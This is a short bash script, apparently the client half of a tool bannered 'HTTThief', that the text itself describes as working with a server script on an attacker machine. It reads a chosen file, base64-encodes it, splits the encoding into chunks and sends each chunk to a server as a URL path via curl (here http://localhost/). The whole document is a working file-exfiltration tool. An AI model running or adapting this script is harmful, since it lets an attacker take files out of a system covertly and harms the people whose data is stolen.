#!/bin/bash
#
#
cat << "EOF"


 █████   █████ ███████████ ███████████ █████       ███              ██████ 
░░███   ░░███ ░█░░░███░░░█░█░░░███░░░█░░███       ░░░              ███░░███
 ░███    ░███ ░   ░███  ░ ░   ░███  ░  ░███████   ████   ██████   ░███ ░░░ 
 ░███████████     ░███        ░███     ░███░░███ ░░███  ███░░███ ███████   
 ░███░░░░░███     ░███        ░███     ░███ ░███  ░███ ░███████ ░░░███░    
 ░███    ░███     ░███        ░███     ░███ ░███  ░███ ░███░░░    ░███     
 █████   █████    █████       █████    ████ █████ █████░░██████   █████    
░░░░░   ░░░░░    ░░░░░       ░░░░░    ░░░░ ░░░░░ ░░░░░  ░░░░░░   ░░░░░     
                                                                           

########################################################################################################
That's the client script. Don't forget to run the server script on you attacker machine before run this.                                                                           
########################################################################################################



EOF


### path to file to be sent
echo "Path to file to be sent"
read path

echo " "

### encoding the file
echo "Enconding the file..."
ENCODED=$(base64 $path)
echo $ENCODED > /tmp/ax0c.txt

echo " "

### organizing the file
echo "Organizating the file..."
tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
FILE="/tmp/ax0d.txt"

echo " "
echo "Doing the magic ;)"
### doing same magic... preparing file to be sent...
for i in $(cat $FILE); do
        echo "http://localhost/$i" >> /tmp/ax0a.txt
done


echo "Send the file..."
echo " "
### sed the file!
FILE2="/tmp/ax0a.txt"
echo $FILE2

for j in $(cat $FILE2); do
        curl $j
done


echo " "
echo "Done!"
